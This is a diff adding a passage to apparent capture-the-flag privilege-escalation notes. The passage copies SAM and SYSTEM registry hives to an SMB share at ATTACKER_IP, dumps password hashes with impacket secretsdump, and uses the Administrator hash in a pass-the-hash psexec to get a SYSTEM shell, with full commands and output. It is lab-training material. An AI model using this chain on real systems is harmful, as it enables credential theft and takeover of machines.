@@ -691,10 +691,41 @@ The easiest way to gain access to another user is to gather credentials from a c
 
     user@attackerpc$ python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
     ```  
+
+    This will create a share named `public` pointing to the `share` directory, which requires the username and password of our current windows session. After this, we can use the `copy` command in our windows machine to transfer both files to our AttackBox:  
+    ```
+    C:\> copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
+    C:\> copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
+    ```  
+
+    And use impacket to retrieve the users' password hashes:  
+    ```
+    user@attackerpc$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
+
+    [*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
+    [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+    Administrator:500:aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94:::
+    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+    ```  
     
+    We can finally use the Administrator's hash to perform a Pass-the-Hash attack and gain access to the target machine with SYSTEM privileges:  
+    ```
+    user@attackerpc$ python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.10.47.234
 
+    [*] Requesting shares on 10.10.175.90.....
+    [*] Found writable share ADMIN$
+    [*] Uploading file nfhtabqO.exe
+    [*] Opening SVCManager on 10.10.175.90.....
+    [*] Creating service RoLE on 10.10.175.90.....
+    [*] Starting service RoLE.....
+    [!] Press help for extra shell commands
+    Microsoft Windows [Version 10.0.17763.1821]
+    (c) 2018 Microsoft Corporation. All rights reserved.
 
-
+    C:\Windows\system32> whoami
+    nt authority\system
+    ```  
+    </detalis>
 
 
 
